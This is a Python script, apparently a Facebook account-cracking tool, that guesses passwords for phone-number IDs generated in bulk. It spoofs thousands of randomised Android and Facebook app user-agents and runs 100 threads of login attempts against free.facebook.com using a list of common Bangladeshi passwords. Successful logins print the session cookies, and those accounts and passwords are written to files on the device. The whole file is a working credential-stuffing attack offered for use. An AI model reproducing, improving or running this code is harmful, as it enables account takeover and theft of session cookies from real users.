
import os,sys,time,json,random,re,string,platform,base64,uuid
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup
import requests as ress
from datetime import date
from datetime import datetime
from time import sleep
from os import system as s
from time import sleep as waktu
try:
    import requests
    from concurrent.futures import ThreadPoolExecutor as ThreadPool
    import mechanize
    from requests.exceptions import ConnectionError
except ModuleNotFoundError:
    os.system('pip install mechanize requests futures bs4==2 > /dev/null')
    os.system('pip install bs4')
loop = 0
oks = []
cps = []
ugen2=[]
ugen=[]
cokbrut=[]
ses=requests.Session()
ugen=[]
uas=[]
for tg in range(5000):
	a='Mozilla/5.0 (Linux; Android'
	b=random.choice(['5.1.1','6.0.1','7.1.1','10','11','12','13','14','15'])
	c='SM-J320Y Build/LMY47X; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
	d=random.randrange(40,115)
	e='0'
	f=random.randrange(3000,6000)
	g=random.randrange(20,100)
	h='Mobile Safari/537.36'
	DEVI=(f"{a} {b}; {c}{d}.{e}.{f}.{g} {h}")
	ugen.append(DEVI)
for ua in range(5000):
      a='Mozilla/5.0 (Linux; Android'
      b=random.choice(['5.1.1' , '6.0.1' , '7.1.1' , '11' , '12' , '13' , '14' , '15'])
      y=random.choice(['SM-J320H' , 'SM-J3109' , 'J320FN' , 'SM-J320P' , 'SM-J320F' , 'SM-J320G' , 'SM-J320Y'])
      c='Build/LMY47X; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
      d=random.randrange(40,115)
      e='0'
      f=random.randrange(3000,6000)
      g=random.randrange(20,100)
      h='Mobile Safari/537.36'
      ug=(f"{a} {b}; {y} {c}{d}.{e}.{f}.{g} {h}")
      ugen.append(ug)
for ua in range(5000):
    a='Realme'
    b=random.randrange(1,9)
    c='-0'
    d=random.randrange(1,9)
    e='/'
    f=random.randrange(1,9)
    g='.0 ('
    h=random.randrange(1,12)
    i='Profile/MIDP-2.1 Configuration/CLDC-1.1'
    j='UNTRUSTED/'
    k=random.randrange(1,3)
    l='.0'
    uaku2=f'{a}{b}{c}{d}{e}{f}{g}{h}{i}{j}{k}{l}'
    ugen.append(uaku2)
for sat in range(1000):
    a='Infinix'
    b=random.randrange(1,9)
    c='-0'
    d=random.randrange(1,9)
    e='/'
    f=random.randrange(1,9)
    g='.0 ('
    h=random.randrange(1,12)
    i='Profile/MIDP-2.1 Configuration/CLDC-1.1'
    j='UNTRUSTED/'
    k=random.randrange(1,3)
    l='.0'
    uaku2=f'{a}{b}{c}{d}{e}{f}{g}{h}{i}{j}{k}{l}'
    ugen.append(uaku2)
#__________________[ M1 ]__________________#
def JAHID_M1():
        ua  = "[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,77)) +";FBBV/"+str(random.randint(1111111,7777777))+";'[FBAN/FB4A;FBAV/348.0.0.39.118;FBBV/338919016;FBDM/{density=3.0,width=1080,height=2176};FBLC/en_US;FBRV/342753089;FBCR/Robi;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G991W;FBSV/12;FBBK/1;FBOP/1;FBCA/arm64-v8a:;]"
        return ua
#__________________[ M2 ]__________________#
def JAHID_M2():
        ua  = "[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,77)) +";FBBV/"+str(random.randint(1111111,7777777))+";'[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748054;FBDM/{density=2.0,width=1200,height=1834};FBLC/en_GB;FBCR/Robi;FBMF/LGE;FBBD/lge;FBPN/com.facebook.katana;FBDV/LG-V500;FBSV/12;nullFBCA/armeabi-v7a:armeabi;]"
        return ua
#__________________[ M3 ]__________________#
def JAHID_M3():
        ua  = "[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,77)) +";FBBV/"+str(random.randint(1111111,7777777))+";'[FBAN/FB4A;FBAV/365.0.0.30.112;FBBV/367653576;FBDM/{density=2.25,width=720,height=1400};FBLC/en_Qaau_US;FBRV/369757394;FBCR/Grameenphone;FBMF/Realme;FBBD/Realme;FBPN/com.facebook.katana;FBDV/RMX1945;FBSV/9;FBOP/1;FBCA/arm64-v8a:;]"
        return ua   
#__________________[new ua]__________________#        
def DEVI():
    bal1=f'Dalvik/2.1.0 (Linux; U; Android 8.0.0; SM-A720F Build/R16NW) [FBAN/Orca-Android;FBAV/196.0.0.29.99;FBPN/com.facebook.orca;FBLC/th_TH;FBBV/135374479;FBCR/Grameenphone;FBMF/samsung;FBBD/samsung;FBDV/SM-A720F;FBSV/8.0.0;FBCA/armeabi-v7a:armeabi;FBDM/'+'{density=3.0,width=1080,height=1920};'+'FB_FW/1;]'
    bal2=f'Dalvik/2.1.0 (Linux; U; Android 5.0.1; GT-I9505 Build/LRX22C) [FBAN/Orca-Android;FBAV/130.0.0.15.89;FBPN/com.facebook.orca;FBLC/sv_SE;FBBV/67467545;FBCR/Robi;FBMF/samsung;FBBD/samsung;FBDV/GT-I9505;FBSV/5.0.1;FBCA/armeabi-v7a:armeabi;FBDM/'+'{density=3.0,width=1080,height=1920};'+'FB_FW/1;]'
    bal3=f'Dalvik/2.1.0 (Linux; U; Android 9; SM-G950U Build/PPR1.180610.011) [FBAN/Orca-Android;FBAV/282.0.0.10.119;FBPN/com.facebook.orca;FBLC/en_US;FBBV/245106389;FBCR/Robi;FBMF/samsung;FBBD/samsung;FBDV/SM-G950U;FBSV/9;FBCA/arm64-v8a:null;FBDM/'+'{density=3.0,width=1080,height=2076};'+f'FB_FW/1;]'
    bal4=f'Dalvik/2.1.0 (Linux; U; Android 10; SM-A515F Build/QP1A.190711.020) [FBAN/Orca-Android;FBAV/305.1.0.16.117;FBPN/com.facebook.orca;FBLC/en_GB;FBBV/280282233;FBCR/airtel;FBMF/samsung;FBBD/samsung;FBDV/SM-A515F;FBSV/10;FBCA/arm64-v8a:null;FBDM/'+'{density=2.625,width=1080,height=2186};'+f'FB_FW/1;]'
    bal5=f'Dalvik/2.1.0 (Linux; U; Android 9; SM-A205GN Build/PPR1.180610.011) [FBAN/Orca-Android;FBAV/242.0.0.15.119;FBPN/com.facebook.orca;FBLC/en_PH;FBBV/184324652;FBCR/Banglalink;FBMF/samsung;FBBD/samsung;FBDV/SM-A205GN;FBSV/9;FBCA/arm64-v8a:null;FBDM/'+'{density=1.75,width=720,height=1423};'+f'FB_FW/1;]'
    bal6=f'Dalvik/2.1.0 (Linux; U; Android 7.0; SM-G935F Build/NRD90M) [FBAN/Orca-Android;FBAV/119.0.0.18.91;FBPN/com.facebook.orca;FBLC/sv_SE;FBBV/58970668;FBCR/Grameenphone;FBMF/samsung;FBBD/samsung;FBDV/SM-G935F;FBSV/7.0;FBCA/armeabi-v7a:armeabi;FBDM/'+'{density=3.0,width=1080,height=1920};'+f'FB_FW/1;]'
    bal7=f'Dalvik/2.1.0 (Linux; U; Android 9; SM-A505GN Build/PPR1.180610.011) [FBAN/Orca-Android;FBAV/241.0.0.17.116;FBPN/com.facebook.orca;FBLC/en_PH;FBBV/182747450;FBCR/Robi;FBMF/samsung;FBBD/samsung;FBDV/SM-A505GN;FBSV/9;FBCA/arm64-v8a:null;FBDM/'+'{density=2.625,width=1080,height=2131};'+f'FB_FW/1;]'
    bal8=f'Dalvik/2.1.0 (Linux; U; Android 10; SM-T290 Build/QP1A.190711.020) [FBAN/Orca-Android;FBAV/364.0.0.10.112;FBPN/com.facebook.orca;FBLC/en_US;FBBV/374667243;FBCR/Airtel;FBMF/samsung;FBBD/samsung;FBDV/SM-T290;FBSV/10;FBCA/arm64-v8a:null;FBDM/'+'{density=1.3312501,width=1280,height=736};'+f'FB_FW/1;]'
    bal9=f'Dalvik/2.1.0 (Linux; U; Android 8; GREEN 2020 Build/OPM1.515294.038) [FBAN/FB4A;FBAV/374.0.0.20.109;FBBV/381462200;FBDM/'+'{density=2.0,width=720,height=1456};'+f'FBLC/en_US;FBRV/382083935;FBCR/1010;FBMF/Green;FBBD/Green;FBPN/com.facebook.katana;FBDV/GREEN 2020;FBSV/11;FBOP/1;FBCA/arm64-v8a:;]'
    return random.choice([bal1,bal2,bal3,bal4,bal5,bal6,bal7,bal8,bal9])       
def UBI():
    application_version = str(random.randint(111,555))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(111,555))
    application_version_code=str(random.randint(000000000,999999999))
    android_version=str(random.randrange(6,13))
    numbr = f'{random.randint(111111, 999999)}.{random.randint(111,999)}'
    build = random.choice(["SP1A.", "TP2A.", "SP1A.", "SP1A.", "TP1A.", "TP1A.", "SP1A.", "TP1A.", "RKQ1.", "TP1A.", "TP1A.", "RP1A.", "RP1A.", "RKQ1.", "TQ3A.", "TD2A.", "TD4A.", "TQ3A.", "TP1A.", "TP1A.", "SP2A.", "SD2A.", "SQ3A.", "RD2A.", "RQ3A.", "RP1A.", "QD4A.", "QQ3A.", "QP1A.", "PQ3B.", "PD2A.", "PPR2.", "PPR1.", "OPM8.", "OPR6."])
    fbs = random.choice(["com.facebook.adsmanager", "com.facebook.lite", "com.facebook.orca", "com.facebook.katana", "com.facebook.mlite"])
    ua1 = f'Davik/2.1.0 (Linux; U; Android {str(android_version)}.0.0; Oppo J793V Build/{str(build)}{str(numbr)}) [FBAN/FB4A;FBAV/{str(application_version)};FBBV/{str(application_version_code)};FBRV/{str(application_version_code)};FBPN/{str(fbs)};FBLC/en_US;FBMF/Oppo;FBBD/Oppo;FBDV/Oppo J793V;FBSV/9;FBCA/armeabi-v7a:armeabi;FBDM/'+'{density=2.0,width=720,height=1440};'+'FB_FW/1;]'
    ua2 = f'Davik/2.1.0 (Linux; U; Android {str(android_version)}.0.0; ASUS_X00RD Build/{str(build)}{str(numbr)}) [FBAN/FB4A;FBAV/{str(application_version)};FBBV/{str(application_version_code)};FBDM/'+'{density=2.0,width=720,height=1352};'+f'FBLC/en_US;FBRV/{str(application_version_code)};FBCR/banglalink;FBMF/asus;FBBD/asus;FBPN/{str(fbs)};FBDV/ASUS_X00RD;FBSV/8.0.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]'
    ua3 = f'Davik/2.1.0 (Linux; U; Android {str(android_version)}.0.0; moto z4 Build/{str(build)}{str(numbr)}) [FBAN/FB4A;FBAV/{str(application_version)};FBBV/{str(application_version_code)};FBDM/'+'{density=3.0,width=1080,height=2120};'+f'FBLC/en_US;FBRV/{str(application_version_code)};FBCR/robi;FBMF/motorola;FBBD/motorola;FBPN/{str(fbs)};FBDV/moto z4;FBSV/9;FBOP/1;FBCA/arm64-v8a:;]'
    ua4 = f'Davik/2.1.0 (Linux; U; Android {str(android_version)}.0.0; motorola one macro Build/{str(build)}{str(numbr)}) [FBAN/FB4A;FBAV/{str(application_version)};FBBV/{str(application_version_code)};FBDM/'+'{density=2.25,width=720,height=1393};'+f'FBLC/en_US;FBRV/{str(application_version_code)};FBCR/Grameenphone;FBMF/motorola;FBBD/motorola;FBPN/{str(fbs)};FBDV/motorola one macro;FBSV/9;FBOP/1;FBCA/arm64-v8a:;]'
    ua5 = f'Davik/2.1.0 (Linux; U; Android {str(android_version)}.0.0; SM-G973U Build/{str(build)}{str(numbr)}) [FBAN/FB4A;FBAV/{str(application_version)};FBBV/{str(application_version_code)};FBDM/'+'{density=3.0,width=1080,height=2024};'+f'FBLC/en_US;FBRV/{str(application_version_code)};FBCR/Sprint;FBMF/samsung;FBBD/samsung;FBPN/{str(fbs)};FBDV/SM-G973U;FBSV/10;FBOP/19;FBCA/arm64-v8a:;]'
    ua6 = f'Davik/2.1.0 (Linux; U; Android {str(android_version)}.0.0; motorola one macro Build/{str(build)}{str(numbr)}) [FBAN/FB4A;FBAV/{str(application_version)};FBBV/{str(application_version_code)};FBDM/'+'{density=2.25,width=720,height=1393};'+f'FBLC/en_US;FBRV/{str(application_version_code)};FBCR/grameenphone;FBMF/motorola;FBBD/motorola;FBPN/{str(fbs)};FBDV/motorola one macro;FBSV/9;FBOP/1;FBCA/arm64-v8a:;]'
    ua7 = f'Davik/2.1.0 (Linux; U; Android {str(android_version)}.0.0; HUAWEI VNS-L21 Build/{str(build)}{str(numbr)}) [FBAN/FB4A;FBAV/{str(application_version)};FBBV/{str(application_version_code)};FBDM/'+'{density=3.0,width=1080,height=1812};'+f'FBLC/en_US;FBRV/{str(application_version_code)};FBCR/Vodafone UA;FBMF/HUAWEI;FBBD/HUAWEI;FBPN/{str(fbs)};FBDV/HUAWEI VNS-L21;FBSV/7.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]'
    ua8 = f'Davik/2.1.0 (Linux; U; Android {str(android_version)}.0.0; PRA-LX1 Build/{str(build)}{str(numbr)}) [FBAN/FB4A;FBAV/{str(application_version)};FBBV/{str(application_version_code)};FBDM/'+'{density=3.0,width=1080,height=1794};'+f'FBLC/en_US;FBRV/{str(application_version_code)};FBCR/AT&amp;FBMF/HUAWEI;FBBD/HUAWEI;FBPN/{str(fbs)};FBDV/PRA-LX1;FBSV/8.0.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]'
    ua9 = f'Davik/2.1.0 (Linux; U; Android {str(android_version)}.0.0; GREEN 2020 Build/{str(build)}{str(numbr)}) [FBAN/FB4A;FBAV/{str(application_version)};FBBV/{str(application_version_code)};FBDM/'+'{density=2.0,width=720,height=1456};'+f'FBLC/en_US;FBRV/{str(application_version_code)};FBCR/robi;FBMF/Green;FBBD/Green;FBPN/{str(fbs)};FBDV/GREEN 2020;FBSV/11;FBOP/1;FBCA/arm64-v8a:;]'
    return random.choice([ua1,ua2,ua3,ua4,ua5,ua6,ua7,ua8,ua9])
#__________________| LOGO |__________________#
logo=("""
 \033[1;93m •✠•  ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━•✠ • \033[2;32m
                                            \033[2;32m🄳🄴🅅🄸 🄺🄸🄽🄶\033[2;32m
            
 \033[1;91m •✠•  ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ •✠ •\033[2;32m 

\033[1;32m..................              
\033[1;32m          ....                  ....          
\033[1;32m       ...                          ...       
\033[1;32m     ..                                ..     
\033[1;32m   ..        .........    ........       ..   
\033[1;32m  ..       ..        ..  ..       ..      ..  
\033[1;32m ..       ..   ....   ....   ....   ..     .. 
\033[1;32m..       ..   ..  ..        ..  ..   ..     ..
\033[1;32m.       ..    ..  ..        ..  ..    ..     .
\033[1;32m.      ..      ....    ..    ....      ..    .
\033[1;32m.      ..               ....             ..  .
\033[1;32m.      ..      ....              ....     .. .
\033[1;32m.       ..    ..  ..            ..  ..    .. .
\033[1;32m..       ..   ..  ..           ..   ..   ..  .
\033[1;32m ..       ..   ....     ..     ....   ..     ..
\033[1;32m ..       ..        ..  ..        ..       .. 
\033[1;32m   ..        .........    .........        ..  
\033[1;32m    ..                                ..     
\033[1;32m       ...                          ...       
\033[1;32m          ....                  ....          
\033[1;32m             ..................
        
\033[1;96m ━━━━━━━━━━━━━━━━━━━\033[1;31m🄳🄴🅅🄸\33[38;5;196m━━━━━━━━━━━━━━━━━━━━
  \x1b[38;5;210m╰─ \033[1;32m[✦]  \033[2;92m🄲🄾🄳🄴🅁 ; 𝐃𝐄𝐕𝐈
  \x1b[38;5;210m╰─ \033[1;36m[✦]  \033[2;96m🄵🄰🄲🄴🄱🄾🄾🄺 ;𝐃𝐄𝐕𝐈 𝐎𝐍𝐅𝐈𝐑𝐄
  \x1b[38;5;210m╰─ \033[1;37m[✦]  \033[2;95m🅃🄾🄾🄻       : 𝐅𝐮𝐜𝐤 𝐒𝐲𝐬𝐭𝐞𝐦
  \x1b[38;5;210m╰─ \033[1;39m[✦]  \033[2;93m🄶🄸🅃🄷🅄🄱   : 𝐃𝐄𝐀𝐓𝐇 𝐇𝐄𝐑𝐄
\033[38;5;46m{+} \x1b[1;96m\33[38;5;196m: [•]🄵🅁🄴🄴-𝗩09\33[38;5;196m 
\033[1;96m ━━━━━━━━━━━━━━━━━━━\033[1;31m🄳🄴🅅🄸\33[38;5;196m━━━━━━━━━━━━━━━━━━━━ 
""")
A = '\x1b[1;97m' 
B = '\x1b[1;96m' 
C = '\x1b[1;91m' 
D = '\033[38;5;46m'
M = '\033[1;31m'
H = '\033[38;5;46m'
N = '\x1b[1;37m'    
E = '\x1b[1;93m' 
F = '\x1b[1;94m'
G = '\x1b[1;95m'
P = '\033[1;37m'
#__________________| PASS |__________________#	

#___________MAIN_____________#
def fuck():
    user=[]
    os.system('clear')
    os.system("xdg-open https://www.facebook.com/profile.php?id=61553924229187")
    print(logo)
    print('[+] SIM CODE BD=> 016•017•018•019')
    nude = input('\033[1;32m[\033[1;32m?\033[1;32m] SIM CODE : ')
    nudex = ''.join(random.choice(string.digits) for _ in range(2))
    nud = ''.join(random.choice(string.digits) for _ in range(2))
    print('[+] 2000•5000•10000•15000•50000')
    limit = int(input('[?] ENTER YOUR CRACK LIMIT : '))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(4))
        user.append(nmp)
    with ThreadPool(max_workers=100) as DEVI:
        os.system('clear')
        print(logo)
        os.system("xdg-open https://www.facebook.com/profile.php?id=61553924229187")
        tl = str(len(user))
        print('\033[1;37m[\033[1;32m✓\033[1;32m] SIM CODE : '+nude)
        print('\033[1;37m[\033[1;32m✓\033[1;32m] WAIT SOME TIME FOR CRACK ')
        print('\033[1;37m[\033[1;32m✓\033[1;32m] JOIN MY GROUP ')
        print('\033[1;37m[\033[1;32m✓\033[1;32m] TOTAL ID : '+tl)
        print('\033[1;32m───────────────────────────────────────────────────────')
        for guru in user:
            uid = nude+nudex+nud+guru
            pwx = [nude+nudex+nud+guru,nud+guru,nudex+guru,'bangla','@@@###','aabbcc','aaabbb','১২৩৪৫৬','১২৩৪৫৬৭৮','102030','405060','708090','bangladesh','Bangladesh','mehedi','mababa','taniya','sumaiya','saiful','jannatul','Fatema','farjana','sabbir','humaira','alamin','mimmim','aaabbb','hridoy','fariya','shakil','roksana','mafiya','habiba','free fire','shahin','i love you','sadiya','ayesha','nusrat','Bangla','arfan@#','gaming','tamanna','jannat','laboni']
            DEVI.submit(rcrack,uid,pwx,tl)
    print('\033[1;32m─────────────────────────────────────────────────────────')
    print('\033[1;37m[\033[1;32m~\033[1;37m] CRACK SUCCESSFULLY COMPLETED..')
    print('\033[1;32m─────────────────────────────────────────────────────────')
def rcrack(uid,pwx,tl):
    global loop
    global cps
    global oks
    global proxy
    try:
        for ps in pwx:
            pro = random.choice(DEVI())
            pro = random.choice(UBI())
            pro = JAHID_M1()
            pro = JAHID_M2()
            pro = JAHID_M3()
            session = requests.Session()
            bi = random.choice([A,B,C,D,E,F,G,H])
            sys.stdout.write(f'\r \033[1;31m[%sDEVI LORD\033[1;31m]\033[1;34m\033[1;31m[\033[38;5;195m%s/%s\033[1;31m]\033[1;34m\033[38;5;45mOK-\033[38;5;46m%s\r'%(bi,loop,tl,len(oks))),
            sys.stdout.flush()
            ua = '[FBAN/FB4A;FBAV/'+str(random.randint(11,99))+'.0.0.'+str(random.randint(1111,9999))+';FBBV/'+str(random.randint(1111111,9999999))+';[FBAN/FB4A;FBAV/348.0.0.39.118;FBBV/338919016;FBDM/{density=3.0,width=1080,height=2176};FBLC/en_US;FBRV/342753089;FBCR/Robi;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G991W;FBSV/12;FBBK/1;FBOP/1;FBCA/arm64-v8a:;]'
            free_fb = session.get('https://free.facebook.com').text
            log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":uid,
            "pass":ps,
            "login":"Log In"}
            header_freefb = { 'authority': 'mbasic.facebook.com',
    'method': 'GET',
    'scheme': 'https', 
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-US,en;q=0.9',
    'cache-control': 'max-age=0',
    'content-type': 'application/x-www-form-urlencoded',
    'origin': 'https://t.facebook.com',
    'referer': 'https://t.facebook.com/',
    'sec-ch-prefers-color-scheme': 'light',
    'sec-ch-ua': '"Not:A-Brand";v="99", "Chromium";v="112"',
    'sec-ch-ua-full-version-list': '"Not:A-Brand";v="99.0.0.0", "Chromium";v="112.0.5615.137"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Linux"',
    'sec-ch-ua-platform-version': '""',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': DEVI(), }
            lo = session.post('https://free.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=log_data,headers=header_freefb).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[65:80]
                print(f"\033[38;5;46m[DEVI-OK🥵] {uid} • {ps}" '  \n\033[1;33m [🍁]\033[1;33mCookie = \033[1;32m'+coki+  '  \033[0;97m')
       
                open('/sdcard/DEVI-OK.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(uid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[82:97]
                print(f"\x1b[38;5;196m[DEVI-CP🥵] {uid} • {ps}")
                open('/sdcard/DEVI-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(uid)
                break
            else:
                continue
        loop+=1
        
    except:
        pass

fuck()

